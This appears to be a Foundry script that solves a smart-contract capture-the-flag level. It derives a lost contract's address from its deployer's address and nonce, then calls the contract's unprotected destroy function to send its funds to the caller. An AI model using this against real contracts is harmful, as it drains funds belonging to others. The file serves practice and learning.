//SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Script} from "forge-std/Script.sol";

contract SolvingScript is Script {
    address _origin = 0x6875423792113Ebc0eb6c45B7f146982908d654b; /* Your instance address */
    address nonce1 = payable(
        address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), _origin, bytes1(0x01))))))
    ); // Computed lost address

    function run() public {
        vm.startBroadcast();
        nonce1.call(abi.encodeWithSignature("destroy(address)", msg.sender));
        vm.stopBroadcast();
    }
}
